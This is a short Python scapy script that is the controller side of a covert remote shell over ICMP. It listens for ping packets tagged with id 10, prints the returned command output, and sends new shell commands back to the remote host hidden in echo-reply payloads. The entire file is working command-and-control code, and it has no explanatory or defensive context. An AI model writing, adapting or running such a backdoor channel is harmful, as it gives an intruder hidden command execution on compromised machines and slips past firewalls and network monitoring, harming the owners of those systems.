from scapy.all import *


# ICMP id 10 = 0xa
def send_packet(ipsrc):
    command = str(input("Shell: "))
    ip_packet = IP(dst=ipsrc) / ICMP(id=10, type=0) / Raw(load=command)
    print("outgoing packet")
    ip_packet.show()
    send(ip_packet)


def check_packet_valid(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].id == 10:
            ip_src = packet[IP].src
            if packet.haslayer(Raw):
                output = packet[Raw].load.decode()
                print(output)
                send_packet(ip_src)
            else:
                send_packet(ip_src)


def main():

    sniff(prn=check_packet_valid, filter="inbound", iface="eth0")


if __name__ == "__main__":
    main()
